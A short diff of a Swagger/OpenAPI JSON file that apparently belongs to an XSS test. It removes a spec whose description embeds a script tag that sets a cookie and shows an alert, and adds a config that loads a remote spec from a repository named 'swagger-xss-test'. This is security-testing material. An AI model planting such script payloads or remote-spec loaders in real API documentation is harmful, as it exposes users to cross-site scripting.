@@ -1,20 +1,9 @@
 {
-  "swagger": "2.0",
-  "info": {
-    "title": "XSS Cookie Test",
-    "version": "1.0.0",
-    "description": "<script>document.cookie = 'xss=true'; alert('XSS Cookie!');</script>"
-  },
-  "paths": {
-    "/test": {
-      "get": {
-        "summary": "Test XSS with Cookies",
-        "responses": {
-          "200": {
-            "description": "Successfully triggered XSS"
-          }
-        }
-      }
+  "url": "https://raw.githubusercontent.com/01-AdeelAhmad/swagger-xss-test/refs/heads/main/swagger-config.yaml",
+  "urls": [
+    {
+      "url": "https://raw.githubusercontent.com/01-AdeelAhmad/swagger-xss-test/refs/heads/main/swagger-config.yaml",
+      "name": "XSS Test API"
     }
-  }
+  ]
 }
